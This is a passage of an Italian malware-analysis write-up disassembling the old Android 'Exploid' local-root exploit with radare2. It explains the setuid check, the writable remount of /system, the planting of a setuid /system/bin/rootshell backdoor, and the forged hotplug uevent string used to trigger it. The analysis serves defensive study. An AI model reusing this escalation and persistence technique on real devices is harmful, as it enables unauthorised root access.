@@ -1,0 +1,837 @@
+;VirusShare_37040d1a0203c101a9dbd70eb6d0efa4
+
+readelf -h VirusShare_37040d1a0203c101a9dbd70eb6d0efa4
+Intestazione ELF:
+Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
+Classe: ELF32
+Dati: complemento a 2, little endian
+Version: 1 (current)
+SO/ABI: UNIX - System V
+Versione ABI: 0
+Tipo: EXEC (file eseguibile)
+Macchina: ARM
+Versione: 0x1
+Indirizzo punto d'ingresso: 0x9340
+Inizio intestazioni di programma 52 (byte nel file)
+Inizio intestazioni di sezione: 8832 (byte nel file)
+Flag: 0x5000002, Version5 EABI, <sconosciuta>
+Size of this header: 52 (bytes)
+Size of program headers: 32 (bytes)
+Number of program headers: 6
+Size of section headers: 40 (bytes)
+Number of section headers: 23
+Section header string table index: 20
+
+;in questo writeup analizzo un campione di malware ELF compilato per architettura ARM 32-bit.
+
+;l'approccio utilizzato prevede l'analisi statica del binario attraverso disassembly con radare2, andando a focalizzare l'analisi sul flusso di esecuzione delle funzioni principali main e rootshell, per comprendere le tecniche di privilege escalation, persistenza e meccanismi di auto-invocazione implementati dal malware. Nel corso dell'analisi ho scoperto che si tratta di un vecchio malware/exploit per Android.
+
+;l'obiettivo è documentare le metodologie di exploit utilizzate sui primi sistemi Android e fornire indicatori di compromissione (IoCs) e regole YARA per il rilevamento.
+
+-----------------------------------------------------------------------------
+
+file VirusShare_37040d1a0203c101a9dbd70eb6d0efa4
+VirusShare_37040d1a0203c101a9dbd70eb6d0efa4: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /system/bin/linker, not stripped
+
+;il programma in questione è stato compilato per l'architettura ARM a 32 bit, utilizzando l'ABI EABI5 (tipico degli ambienti Android di vecchia generazione). L'assenza di stripping indica che il binario conserva informazioni utili per l'analisi, come simboli di funzione e variabili globali.
+
+;funzione main
+
+;la funzione main è il punto di ingresso principale del programma. In un ambiente Android, per un eseguibile nativo, questa funzione è tipicamente invocata dal sistema operativo al momento dell'avvio dell'applicazione. Il flusso di esecuzione inizia con l'invocazione del linker dinamico, specificato come /system/bin/linker. Questo linker è responsabile del caricamento delle librerie condivise necessarie e della risoluzione dei simboli.
+
+;una volta che il linker ha completato il caricamento, il controllo viene passato alla funzione main. All'interno della main, vengono eseguite le inizializzazioni necessarie, come l'impostazione dell'ambiente di esecuzione e la preparazione per l'esecuzione delle funzioni principali del programma.
+
+[0x00008c78]> s main
+[0x00008e4c]> pdf
+
+0x00008ed8 mov r3, 0
+0x00008edc str r3, [ptr] ; 0x41c ; 1052
+0x00008ee0 bl sym.imp.geteuid ; uid_t geteuid(void)
+
+0x00008ee4 mov r3, r0
+0x00008ee8 cmp r3, 0
+0x00008eec bne 0x8f08
+0x00008ef0 bl sym.imp.getuid ; uid_t getuid(void)
+
+0x00008ef4 mov r3, r0
+0x00008ef8 cmp r3, 0
+0x00008efc beq 0x8f08
+
+;l'inizio della main mostra allocazioni di stack, salvataggi di registri e setup preliminari, seguiti da un controllo cruciale sugli UID:
+
+;recupera l'effective UID del processo.
+;se l'eUID è diverso da 0 (quindi non root effettivo) --> salta a 0x8f08.
+;se invece l'eUID è 0, viene controllato anche il real UID.
+;se anche l'UID reale è 0 (cioè processo eseguito direttamente come root) --> salta a 0x8f08.
+;solo se eUID == 0 ma UID != 0 (caso setuid root eseguito da utente non-root) il programma prosegue.
+;in pratica: rifiuta sia l'esecuzione come utente normale, sia come root puro;
+;accetta soltanto il caso setuid-root.
+
+;questa logica esclude sia l'esecuzione da utente normale, sia da root puro: il binario vuole esplicitamente essere usato come exploit setuid-root. È un meccanismo tipico di alcuni exploit e malware Android: accetta solo escalation tramite setuid, non esecuzione diretta da root, probabilmente per evitare operazioni inutili o per limitare i crash in ambienti già privilegiati.
+
+-----------------------------------------------------------------------------
+
+0x00008f00 ldr r0, [var_458h] ; 0x458 ; 1112 ; int32_t arg1
+0x00008f04 bl sym.rootshell
+
+;la funzione rootshell (analizzata successivamente nel Report) esegue controlli preliminari (es. verifica se lo stdin è un terminale valido) e concede l'accesso a una shell con privilegi elevati soltanto se il processo è stato lanciato in modalità setuid-root da un utente non-root. In questo modo impedisce l'uso diretto da parte dell'utente root.
+
+0x00008f08 sub r3, var_sp_400h
+0x00008f0c sub r3, var_418h
+0x00008f10 sub r3, ptr
+0x00008f14 ldr r2, [0x000092dc] ; [0x92dc:4]=0xfffff388
+0x00008f18 add r2, r4, r2 ; 0x9478 ; "/proc/self/exe"
+0x00008f1c mov r0, r2 ; 0x9478 ; "/proc/self/exe"
+0x00008f20 mov r1, r3
+0x00008f24 mov r2, 0x200
+0x00008f28 bl sym.imp.readlink
+
+;l'exploit/malware usa readlink("/proc/self/exe", buf, 0x200) per ottenere il path reale del binario in esecuzione.
+;/proc/self/exe è un link simbolico al file eseguibile corrente: in questo modo il programma ricostruisce il percorso effettivo da cui è stato lanciato per validare il path di origine o vincolare l'esecuzione a una certa posizione nel filesystem.
+
+0x00008f2c mov r3, r0 ; 0x9478 ; "/proc/self/exe"
+0x00008f30 cmp r3, 0
+0x00008f34 bge 0x8f48
+
+;controlla il risultato di readlink: se è negativo significa errore nella lettura del link simbolico (es. permessi insufficienti o path non valido) e quindi il programma salta al ramo di uscita.
+;se >=0, il buffer contiene la lunghezza del path letto e il programma prosegue normalmente.
+
+0x00008f38 ldr r3, [0x000092e0] ; [0x92e0:4]=0xfffff398
+0x00008f3c add r3, r4, r3 ; 0x9488 ; "[-] readlink"
+0x00008f40 mov r0, r3 ; 0x9488 ; "[-] readlink" ; char *arg1
+0x00008f44 bl sym.die
+
+;se readlink("/proc/self/exe") fallisce, il programma chiama die() e termina con l'errore "[-] readlink"
+
+0x00008f48 bl sym.imp.geteuid ; uid_t geteuid(void)
+0x00008f4c mov r3, r0 ; 0x9478 ; "/proc/self/exe"
+0x00008f50 cmp r3, 0
+0x00008f54 bne 0x900c
+
+;controlla se l'effective UID è root: se non lo è, il programma salta a 0x900c.
+;se invece eUID == 0, continua l'esecuzione nel flusso principale.
+
+0x00008f58 bl sym.clear_hotplug
+
+;clear_hotplug() serve a neutralizzare la meccanica di esecuzione automatica via hotplug, scrivendo un valore vuoto dentro a /proc/sys/kernel/hotplug.
+
+;clear_hotplug() apre /proc/sys/kernel/hotplug in scrittura, scrive 1 byte (probabilmente \0) e chiude il file.
+;questo neutralizza la meccanica di esecuzione automatica via hotplug, disattivando eventuali comandi configurati.
+;in altre parole, il binario "ripulisce" il file hotplug.
+
+0x00008f5c mov r3, 0
+0x00008f60 str r3, [sp]
+0x00008f64 ldr r3, [0x000092e4] ; [0x92e4:4]=0xfffff3a8
+0x00008f68 add r3, r4, r3 ; 0x9498 ; "/dev/block/mmcblk1p21"
+0x00008f6c mov r0, r3 ; 0x9498 ; "/dev/block/mmcblk1p21"
+0x00008f70 ldr r3, [0x000092e8] ; [0x92e8:4]=0xfffff3c0
+0x00008f74 add r3, r4, r3 ; 0x94b0 ; "/system"
+0x00008f78 mov r1, r3 ; 0x94b0 ; "/system"
+0x00008f7c ldr r3, [0x000092ec] ; [0x92ec:4]=0xfffff3c8
+0x00008f80 add r3, r4, r3 ; 0x94b8 ; "ext3"
+0x00008f84 mov r2, r3 ; 0x94b8 ; "ext3"
+0x00008f88 mov r3, 0x20
+0x00008f8c bl sym.imp.mount
+
+;il binario effettua un remount di /system dal device fisico mmcblk1p21, tipicamente montato come read-only su Android.
+;l'uso di MS_REMOUNT permette di cambiare le modalità di mount senza smontare il filesystem, di fatto consentendo di renderlo scrivibile.
+
+grep MS_REMOUNT /usr/include/sys/mount.h
+MS_REMOUNT = 32, ;0x20
+0x00008f88 mov r3, 0x20
+
+;questo è comunemente utilizzato per operazioni di persistenza o modifiche profonde al sistema:
+
+;scrittura di file nascosti, binari o script.
+;alterazione di configurazioni di sistema.
+;installazione di backdoor persistenti.
+
+;non si tratta di un mount normale per accedere a un device, ma di un remount mirato a ottenere controllo completo sul filesystem di sistema.
+
+0x00008f90 mov r3, r0 ; 0x9498 ; "/dev/block/mmcblk1p21"
+0x00008f94 cmp r3, 0
+0x00008f98 bge 0x8fd0
+
+0x00008f9c mov r3, 0
+0x00008fa0 str r3, [sp]
+0x00008fa4 ldr r3, [0x000092e4] ; [0x92e4:4]=0xfffff3a8
+0x00008fa8 add r3, r4, r3 ; 0x9498 ; "/dev/block/mmcblk1p21"
+0x00008fac mov r0, r3 ; 0x9498 ; "/dev/block/mmcblk1p21"
+0x00008fb0 ldr r3, [0x000092e8] ; [0x92e8:4]=0xfffff3c0
+0x00008fb4 add r3, r4, r3 ; 0x94b0 ; "/system"
+0x00008fb8 mov r1, r3 ; 0x94b0 ; "/system"
+0x00008fbc ldr r3, [0x000092ec] ; [0x92ec:4]=0xfffff3c8
+0x00008fc0 add r3, r4, r3 ; 0x94b8 ; "ext3"
+0x00008fc4 mov r2, r3 ; 0x94b8 ; "ext3"
+0x00008fc8 mov r3, 0x20
+0x00008fcc bl sym.imp.mount
+
+;su Android/embedded spesso il remount può fallire a causa di lock del filesystem o mount point già occupato.
+;questo codice è robusto: tenta una volta, se fallisce, prova di nuovo.
+;l'intento è sempre ottenere la scrittura su /system, indipendentemente dal fatto che la prima syscall fallisca.
+
+0x00008fd0 sub r3, var_sp_400h
+0x00008fd4 sub r3, var_418h
+0x00008fd8 sub r3, ptr
+0x00008fdc mov r0, r3 ; int32_t arg1
+0x00008fe0 ldr r3, [0x000092f0] ; [0x92f0:4]=0xfffff3d0
+0x00008fe4 add r3, r4, r3 ; 0x94c0 ; "/system/bin/rootshell"
+0x00008fe8 mov r1, r3 ; 0x94c0 ; "/system/bin/rootshell" ; int32_t arg2
+0x00008fec bl sym.copy
+
+;copia il proprio eseguibile (il binario attualmente in esecuzione) in /system/bin/rootshell.
+;questo crea una backdoor persistente direttamente nel filesystem di sistema scrivibile (dopo il remount).
+;una copia in /system/bin con setuid root trasforma il binario in un punto di persistenza permanente e accessibile, perché sopravvive ai reboot e mantiene privilegi elevati.
+
+0x00008ff0 ldr r3, [0x000092f0] ; [0x92f0:4]=0xfffff3d0
+0x00008ff4 add r3, r4, r3 ; 0x94c0 ; "/system/bin/rootshell"
+0x00008ff8 mov r0, r3 ; 0x94c0 ; "/system/bin/rootshell" ; const char *path
+0x00008ffc mov r1, 0x9e0
+0x00009000 add r1, r1, 0xd ; int mode
+0x00009004 bl sym.imp.chmod ; int chmod(const char *path, int mode)
+
+;imposta i permessi per rendere la rootshell eseguibile e il setuid root.
+;tipicamente 0x9e0 + 0xd equivale a 4755 --> setuid root + eseguibile da tutti.
+
+>>> 0x9e0 + 0xd
+2541
+>>> oct(2541)
+'0o4755'
+
+0x00009008 b 0x9008
+
+;strana istruzione, sembra un loop infinito. Probabilmente serve a mantenere il processo residente in memoria, oppure a evitare che il binario termini subito, lasciando dietro di sé un ambiente stabile con la backdoor già installata.
+;il loop infinito è probabilmente una forma primitiva ma efficace di daemonizzazione, garantendo che il processo rimanga residente per intercettare eventi hotplug senza consumare risorse significative.
+
+0x0000900c ldr r3, [0x000092f4] ; [0x92f4:4]=0xfffff3e8
+0x00009010 add r3, r4, r3 ; 0x94d8 ; "[*] Android local root exploid (C) The Android Exploid Crew"
+0x00009014 mov r0, r3 ; 0x94d8 ; "[*] Android local root exploid (C) The Android Exploid Crew" ; const char *s
+0x00009018 bl sym.imp.puts ; int puts(const char *s)
+
+0x0000901c ldr r3, [0x000092f8] ; [0x92f8:4]=0xfffff428 ; "(\xf4\xff\xffP\xf4\xff\xffh\xf4\xff\xffx\xf4\xff\xff\x98\xf4\xff\xff\xc8\xf4\xff\xff\xd8\xf4\xff\xff\xe0\xf4\xff\xff\xe8\xf4\xff\xff\xa0\xf2\xff\xff\xb0\xf2\xff\xff\xf8\xf4\xff\xff"
+0x00009020 add r3, r4, r3 ; 0x9518 ; "[*] Modified by birdman for the DroidX"
+0x00009024 mov r0, r3 ; 0x9518 ; "[*] Modified by birdman for the DroidX" ; const char *s
+0x00009028 bl sym.imp.puts ; int puts(const char *s)
+
+;semplice output informativo, niente di funzionale.
+
+0x0000902c ldr r3, [0x000092fc] ; [0x92fc:4]=0xfffff450 ; "P\xf4\xff\xffh\xf4\xff\xffx\xf4\xff\xff\x98\xf4\xff\xff\xc8\xf4\xff\xff\xd8\xf4\xff\xff\xe0\xf4\xff\xff\xe8\xf4\xff\xff\xa0\xf2\xff\xff\xb0\xf2\xff\xff\xf8\xf4\xff\xff"
+0x00009030 add r3, r4, r3 ; 0x9540 ; "/sqlite_stmt_journals"
+0x00009034 str r3, [ptr] ; 0x41c ; 1052
+0x00009038 ldr r0, [ptr] ; 0x41c ; 1052
+0x0000903c bl sym.imp.chdir
+
+;cambia la working directory in /sqlite_stmt_journals.
+
+0x00009040 mov r3, r0
+0x00009044 cmp r3, 0
+0x00009048 bge 0x9090
+0x0000904c ldr r3, [0x00009300] ; [0x9300:4]=0xfffff468 ; "h\xf4\xff\xffx\xf4\xff\xff\x98\xf4\xff\xff\xc8\xf4\xff\xff\xd8\xf4\xff\xff\xe0\xf4\xff\xff\xe8\xf4\xff\xff\xa0\xf2\xff\xff\xb0\xf2\xff\xff\xf8\xf4\xff\xff"
+0x00009050 add r3, r4, r3 ; 0x9558 ; "/data/local/tmp"
+0x00009054 str r3, [ptr] ; 0x41c ; 1052
+0x00009058 ldr r0, [ptr] ; 0x41c ; 1052
+0x0000905c bl sym.imp.chdir
+
+;se il cambio directory in /sqlite_stmt_journals fallisce, tenta il cd in /data/local/tmp.
+;questo permette di garantire una working directory scrivibile prima di operazioni successive.
+;/data/local/tmp è spesso usata nei dispositivi Android per scrivere file temporanei.
+
+0x00009060 mov r3, r0
+0x00009064 cmp r3, 0
+0x00009068 bge 0x9090
+0x0000906c sub r3, src
+0x00009070 mov r0, r3
+0x00009074 mov r1, 0x200
+0x00009078 bl sym.imp.getcwd
+
+;se il cambio directory precedente fallisce, legge la directory corrente con getcwd e la salva in un buffer locale di dimensione 0x200 byte.
+
+0x0000907c mov r3, r0
+0x00009080 mov r0, r3 ; const char *src
+0x00009084 bl sym.imp.strdup ; char *strdup(const char *src)
+
+;duplica la stringa ottenuta da getcwd nella memoria heap.
+;in pratica: conserva una copia della working directory corrente, probabilmente per usarla come riferimento di base per operazioni successive o per costruire percorsi assoluti.
+
+0x00009088 mov r3, r0
+0x0000908c str r3, [ptr] ; 0x41c ; 1052
+
+0x00009090 sub r3, var_sp_400h
+0x00009094 sub r3, var_418h
+0x00009098 sub r3, ptr
+0x0000909c ldr r2, [0x00009304] ; [0x9304:4]=0xfffff478 ; "x\xf4\xff\xff\x98\xf4\xff\xff\xc8\xf4\xff\xff\xd8\xf4\xff\xff\xe0\xf4\xff\xff\xe8\xf4\xff\xff\xa0\xf2\xff\xff\xb0\xf2\xff\xff\xf8\xf4\xff\xff"
+0x000090a0 add r2, r4, r2 ; 0x9568 ; "[+] Using basedir=%s, path=%s\n"
+0x000090a4 mov r0, r2 ; 0x9568 ; "[+] Using basedir=%s, path=%s\n" ; const char *format
+0x000090a8 ldr r1, [ptr] ; 0x41c ; 1052
+0x000090ac mov r2, r3
+0x000090b0 bl sym.imp.printf ; int printf(const char *format)
+
+;stampa informativa su basedir e path corrente, utile per debug o per confermare dove il malware/exploit sta operando.
+
+0x000090b4 ldr r3, [0x00009308] ; [0x9308:4]=0xfffff498
+0x000090b8 add r3, r4, r3 ; 0x9588 ; "[+] opening NETLINK_KOBJECT_UEVENT socket"
+0x000090bc mov r0, r3 ; 0x9588 ; "[+] opening NETLINK_KOBJECT_UEVENT socket" ; const char
+0x000090c0 bl sym.imp.puts ; int puts(const char *s)
+
+;indica che sta per aprire un socket NETLINK_KOBJECT_UEVENT. Il tipo NETLINK_KOBJECT_UEVENT serve nello specifico per ricevere le uevent, cioè notifiche inviate dal kernel quando succedono eventi legati ai device.
+
+0x000090c4 sub r3, var_42ch
+0x000090c8 sub r3, var_438h
+0x000090cc sub r3, s
+0x000090d0 mov r0, r3 ; void *s
+0x000090d4 mov r1, 0 ; int c
+0x000090d8 mov r2, 0xc
+0x000090dc bl sym.imp.memset ; void *memset(void *s, int c, size_t n)
+
+;azzera il buffer 's', probabilmente per prepararlo a ricevere dati o per ragioni di sicurezza.
+
+0x000090e0 mov r3, 1
+0x000090e4 str r3, [var_438h] ; 0x42c ; 1068
+0x000090e8 mvn r3, 0x420
+0x000090ec sub r3, r3, 3
+0x000090f0 mov r2, 0x10
+0x000090f4 sub r1, fp, 0xc
+0x000090f8 strh r2, [r1, r3]
+0x000090fc mov r0, 0x10 ; int domain
+0x00009100 mov r1, 2 ; int type
+0x00009104 mov r2, 0xf
+0x00009108 bl sym.imp.socket ; int socket(int domain, int type, int protocol)
+
+;crea un socket NETLINK_KOBJECT_UEVENT:
+
+;domain = AF_NETLINK (0x10) --> comunica con il kernel via netlink.
+;type = SOCK_DGRAM (2) --> datagram socket.
+;protocol = NETLINK_KOBJECT_UEVENT (15) --> riceve eventi hotplug del kernel.
+
+;questo permette al malware di intercettare eventi hardware e presumibilmente rilanciarsi automaticamente in risposta a trigger del kernel (ad esempio inserimento USB, mount di device, ecc.).
+
+0x0000910c mov r3, r0
+0x00009110 str r3, [var_424h] ; 0x418 ; 1048
+0x00009114 ldr r3, [var_424h] ; 0x418 ; 1048
+0x00009118 cmp r3, 0
+0x0000911c bge 0x9130
+
+0x00009120 ldr r3, [0x0000930c] ; [0x930c:4]=0xfffff4c8
+0x00009124 add r3, r4, r3 ; 0x95b8 ; "[-] socket"
+0x00009128 mov r0, r3 ; 0x95b8 ; "[-] socket" ; char *arg1
+
+0x0000912c bl sym.die
+
+;if socket < 0: die("[-] socket")
+;esce se non riesce a creare il socket.
+
+;dopo aver installato la rootshell, l'exploit prepara l'ambiente: si sposta in cartelle scrivibili (/data/local/tmp), registra il path corrente per riferimenti futuri e crea un socket NETLINK per ascoltare eventi kernel di tipo UEVENT. In questo modo può reagire a nuovi dispositivi o trigger hardware, collegando la sua backdoor persistente a meccanismi di sistema.
+
+0x00009130 ldr r3, [0x00009310] ; [0x9310:4]=0xfffff4d8
+0x00009134 add r3, r4, r3 ; 0x95c8 ; "loading"
+0x00009138 mov r0, r3 ; 0x95c8 ; "loading"
+0x0000913c mov r1, 0x1b4
+0x00009140 add r1, r1, 2
+0x00009144 bl sym.imp.creat
+
+0x00009148 mov r3, r0 ; 0x95c8 ; "loading"
+0x0000914c mov r0, r3 ; 0x95c8 ; "loading" ; int fildes
+0x00009150 bl sym.imp.close ; int close(int fildes)
+
+0x00009154 ldr r3, [0x00009314] ; [0x9314:4]=0xfffff4e0
+0x00009158 add r3, r4, r3 ; 0x95d0 ; "hotplug"
+0x0000915c mov r0, r3 ; 0x95d0 ; "hotplug"
+0x00009160 mov r1, 0x1a4
+0x00009164 bl sym.imp.creat
+
+0x00009168 mov r3, r0 ; 0x95d0 ; "hotplug"
+0x0000916c str r3, [var_420h] ; 0x414 ; 1044
+0x00009170 ldr r3, [var_420h] ; 0x414 ; 1044
+0x00009174 cmp r3, 0
+0x00009178 bge 0x918c
+0x0000917c ldr r3, [0x00009318] ; [0x9318:4]=0xfffff4e8
+0x00009180 add r3, r4, r3 ; 0x95d8 ; "[-] creat"
+0x00009184 mov r0, r3 ; 0x95d8 ; "[-] creat" ; char *arg1
+0x00009188 bl sym.die
+
+;dopo aver cambiato directory (prima /sqlite_stmt_journals, poi /data/local/tmp se la prima fallisce), l'exploit crea due file:
+
+"loading" --> con permessi 0666
+"hotplug" --> con permessi 0644
+
+;questi file non contengono codice eseguibile, ma servono come marker di stato: indicano all'exploit che la fase di setup è avvenuta e permettono di coordinare i passaggi successivi, come l'attivazione del meccanismo di hotplug o il loop infinito della rootshell. Se il malware trova /data/local/temp/loading o /data/local/temp/hotplug (o nella cartella /sqlite_stmt_journals), capisce che il dispositivo è già stato infettato.
+
+0x0000918c sub r3, var_sp_400h
+0x00009190 sub r3, var_418h
+0x00009194 sub r3, ptr
+0x00009198 mov r0, r3 ; const char *s
+0x0000919c bl sym.imp.strlen ; size_t strlen(const char *s)
+
+0x000091a0 mov r2, r0
+0x000091a4 sub r3, var_sp_400h
+0x000091a8 sub r3, var_418h
+0x000091ac sub r3, ptr
+0x000091b0 ldr r0, [var_420h] ; 0x414 ; 1044 ; int fd
+0x000091b4 mov r1, r3 ; const char *ptr
+0x000091b8 bl sym.imp.write ; ssize_t write(int fd, const char *ptr, size_t nbytes)
+
+;prepara il file affinché, se il kernel legge /proc/sys/kernel/hotplug, trovi un valore specifico (come il percorso dell'eseguibile da eseguire).
+
+;poi prende il file descriptor salvato in var_420h (che corrisponde al file "hotplug") e fa una write(fd, ptr, strlen(ptr)).
+
+0x000091bc mov r3, r0
+0x000091c0 cmp r3, 0
+0x000091c4 bge 0x91d8
+0x000091c8 ldr r3, [0x0000931c] ; [0x931c:4]=0xfffff2a0
+0x000091cc add r3, r4, r3 ; 0x9390 ; "[-] write"
+0x000091d0 mov r0, r3 ; 0x9390 ; "[-] write" ; char *arg1
+0x000091d4 bl sym.die
+
+;in caso la write fallisca, esce.
+
+0x000091d8 ldr r0, [var_420h] ; 0x414 ; 1044 ; int fildes
+0x000091dc bl sym.imp.close ; int close(int fildes)
+
+;chiude il file.
+
+0x000091e0 ldr r3, [0x00009320] ; [0x9320:4]=0xfffff2b0
+0x000091e4 add r3, r4, r3 ; 0x93a0 ; "/proc/sys/kernel/hotplug"
+0x000091e8 mov r0, r3 ; 0x93a0 ; "/proc/sys/kernel/hotplug" ; const char *path1
+0x000091ec ldr r3, [0x00009324] ; [0x9324:4]=0xfffff4f8
+0x000091f0 add r3, r4, r3 ; 0x95e8 ; "data"
+0x000091f4 mov r1, r3 ; 0x95e8 ; "data" ; const char *path2
+0x000091f8 bl sym.imp.symlink ; int symlink(const char *path1, const char *path2)
+
+;sta creando un symlink data che punta a /proc/sys/kernel/hotplug
+;scrivere in /proc/sys/kernel/hotplug richiede privilegi di root, anche se l'eseguibile ha SUID root. Usare un symlink in una directory scrivibile dall'utente normale è un modo per aggirare certe restrizioni o complicazioni di sicurezza. Ogni volta che il kernel cerca di invocare il programma di hotplug (es. quando viene inserita una USB, inserimento del cavo di alimentazione/caricabatterie o altri eventi hardware gestiti da hotplug), esegue il malware.
+
+0x000091fc sub r3, src
+0x00009200 ldr r2, [ptr] ; 0x41c ; 1052
+0x00009204 str r2, [sp]
+0x00009208 mov r2, 0
+0x0000920c str r2, [var_4h]
+0x00009210 mov r2, 0
+0x00009214 str r2, [var_8h]
+0x00009218 ldr r2, [ptr] ; 0x41c ; 1052
+0x0000921c str r2, [var_0h]
+0x00009220 mov r2, 0
+0x00009224 str r2, [var_4h]
+0x00009228 mov r0, r3 ; char *s
+0x0000922c mov r1, 0x200 ; size_t size
+0x00009230 ldr r3, [0x00009328] ; [0x9328:4]=0xfffff500
+0x00009234 add r3, r4, r3 ; 0x95f0 ; "ACTION=add%cDEVPATH=/..%s%cSUBSYSTEM=firmware%cFIRMWARE=../../..%s/hotplug%c"
+│ 0x00009238 0320a0e1 mov r2, r3 ; 0x95f0 ; "ACTION=add%cDEVPATH=/..%s%cSUBSYSTEM=firmware%cFIRMWARE=../../..%s/hotplug%c"
+0x0000923c mov r3, 0
+0x00009240 bl sym.imp.snprintf ; int snprintf(char *s, size_t size, const char *format, ...)
+
+;sta simulando un evento di hotplug del kernel, linkando la variabile FIRMWARE verso il symlink che punta al file hotplug.
+
+;in pratica, il malware sta costruendo un pacchetto di dati che, se passato al kernel tramite il socket NETLINK_KOBJECT_UEVENT, farà sì che il kernel esegua l'eseguibile indicato nel file hotplug.
+
+;è il trucco finale per far partire la rootshell automaticamente senza bisogno che l'utente faccia nulla: persistenza + trigger via evento hotplug.
+
+0x00009244 ldr r3, [0x0000932c] ; [0x932c:4]=0xfffff550 ; ffp\xf5\xff\xff\x80\xf5\xff\xff"
+0x00009248 add r3, r4, r3 ; 0x9640 ; "[+] sending add message ..."
+0x0000924c mov r0, r3 ; 0x9640 ; "[+] sending add message ..." ; const char *s
+0x00009250 bl sym.imp.puts ; int puts(const char *s)
+
+;puts di debug.
+
+0x00009254 sub r3, var_44ch
+0x00009258 sub r3, var_458h
+0x0000925c ldr r0, [var_424h] ; 0x418 ; 1048
+0x00009260 mov r1, r3
+0x00009264 mov r2, 0
+0x00009268 bl sym.imp.sendmsg
+
+;invia il messaggio al socket creato.
+
+0x0000926c mov r3, r0
+0x00009270 cmp r3, 0
+0x00009274 bge 0x9288
+0x00009278 ldr r3, [0x00009330] ; [0x9330:4]=0xfffff570 ; "p\xf5\xff\xff\x80\xf5\xff\xff"
+0x0000927c add r3, r4, r3 ; 0x9660 ; "[-] sendmsg"
+0x00009280 mov r0, r3 ; 0x9660 ; "[-] sendmsg" ; char *arg1
+0x00009284 bl sym.die
+
+;se qualcosa va male esce.
+
+0x00009288 ldr r0, [var_424h] ; 0x418 ; 1048 ; int fildes
+0x0000928c bl sym.imp.close ; int close(int fildes)
+
+;chiude il file.
+
+0x00009290 ldr r3, [0x00009334] ; [0x9334:4]=0xfffff580
+0x00009294 add r3, r4, r3 ; 0x9670 ; "[*] Try to invoke hotplug now, clicking at the wireless\n[*] settings, plugin USB key etc.\n[*] You succeeded if you find /system/bin/rootshell.\n[*] GUI might hang/restart meanwhile so be patient."
+│ 0x00009298 0300a0e1 mov r0, r3 ; 0x9670 ; "[*] Try to invoke hotplug now, clicking at the wireless\n[*] settings, plugin USB key etc.\n[*] You succeeded if you find /system/bin/rootshell.\n[*] GUI might hang/restart meanwhile so be patient." ; const char *s
+0x0000929c bl sym.imp.puts ; int puts(const char *s)
+
+;informazioni di debug.
+
+0x000092a0 mov r0, 3 ; int s
+0x000092a4 bl sym.imp.sleep ; int sleep(int s)
+
+0x000092a8 mov r3, 0
+0x000092ac mov r0, r3
+0x000092b0 ldr r3, [0x000092d8] ; [0x92d8:4]=144
+0x000092b4 ldr r3, [r4, r3] ; 0xa180
+; reloc.__stack_chk_guard
+0x000092b8 ldr r2, [var_10h] ; 0x10 ; 16
+0x000092bc ldr r3, [r3]
+0x000092c0 cmp r2, r3
+0x000092c4 beq 0x92cc
+0x000092c8 bl sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+
+0x000092cc sub sp, var_8h_2
+0x000092d0 pop {r4, fp, pc}
+
+;chiusura della funzione
+
+;persistenza su /system
+
+;readlink("/proc/self/exe") --> recupera il path del binario corrente, utile per autoriferimento.
+;clear_hotplug() --> svuota /proc/sys/kernel/hotplug, disattivando la meccanica preesistente.
+;remount di /system da /dev/block/mmcblk1p21 in modalità scrivibile (ext3).
+;se fallisce al primo tentativo, riprova.
+;questo step è fondamentale: /system in Android è di norma read-only.
+;copia la rootshell in system --> /system/bin/rootshell
+;il binario copia se stesso dentro /system/bin/rootshell.
+;successivamente applica chmod 4755, ottenendo una backdoor permanente setuid-root.
+;questo garantisce che, anche dopo il reboot, l'accesso privilegiato rimanga disponibile.
+
+;ambiente di esecuzione
+
+;il malware poi si "sistema" nell'ambiente:
+;cambia working directory: prima in /sqlite_stmt_journals, se fallisce in /data/local/tmp.
+;se entrambe falliscono, usa la cwd attuale (via getcwd).
+;stampa messaggi informativi, tipici di tool exploit pubblici ("[*] Android local root exploid (C) The Android Exploid Crew", "Modified by birdman for the DroidX").
+;questi messaggi confermano che il binario appartiene alla famiglia degli exploit Android Exploid (circa 2010).
+
+;meccanismo di trigger
+
+;apre un socket NETLINK_KOBJECT_UEVENT, collegandosi al kernel per ricevere eventi hotplug.
+;crea file "loading" e "hotplug" nella working directory.
+;scrive valori nel file "hotplug", che presumibilmente vengono letti dal kernel attraverso /proc/sys/kernel/hotplug.
+;in questo modo l'exploit si collega al meccanismo di hotplug del kernel, facendo sì che eventi hardware (come l'inserimento di un device USB) possano riattivare l'esecuzione del binario.
+
+-----------------------------------------------------------------------------
+
+;funzione rootshell
+
+;la funzione rootshell rappresenta una parte critica del programma. Il suo nome suggerisce che potrebbe essere coinvolta nell'acquisizione di privilegi elevati o nell'esecuzione di comandi con privilegi di root.
+
+;in generale, una funzione denominata rootshell potrebbe tentare di sfruttare vulnerabilità nel sistema per ottenere accesso come superutente. Questo potrebbe comportare l'esecuzione di comandi di sistema con privilegi elevati, consentendo al programma di bypassare le restrizioni di sicurezza e accedere a risorse protette.
+
+;se le condizioni sugli UID sono rispettate, il programma invoca la rootshell, che concede una shell privilegiata. Altrimenti, prosegue con la fase successiva dell'exploit.
+
+[0x00008e4c]> s sym.rootshell
+[0x00008c78]> pdf
+
+0x00008c78 push {r4, fp, lr}
+0x00008c7c add fp, var_8h
+0x00008c80 sub sp, sp, 0x9c
+0x00008c84 ldr r4, [0x00008e20] ; [0x8e20:4]=0x1460
+0x00008c88 add r4, pc, r4 ; 0xa0f0 ; " \xa0"
+0x00008c8c str r0, [var_a0h] ; 0xa0 ; 160 ; arg1
+0x00008c90 ldr r3, [0x00008e24] ; [0x8e24:4]=144
+0x00008c94 ldr r3, [r4, r3] ; 0xa180
+; reloc.__stack_chk_guard
+
+;equivalente del canary.
+
+0x00008c98 ldr r3, [r3]
+0x00008c9c str r3, [var_10h] ; 0x10 ; 16
+0x00008ca0 ldr r3, [0x00008e28] ; [0x8e28:4]=0xfffff2d8
+0x00008ca4 add r3, r4, r3 ; 0x93c8 ; "/system/bin/sh"
+0x00008ca8 str r3, [var_98h] ; 0x98 ; 152
+0x00008cac mov r3, 0
+0x00008cb0 str r3, [var_a0h] ; 0x94 ; 148
+0x00008cb4 sub r3, buf
+0x00008cb8 mov r0, r3 ; void *s
+0x00008cbc mov r1, 0 ; int c
+0x00008cc0 mov r2, 0x80
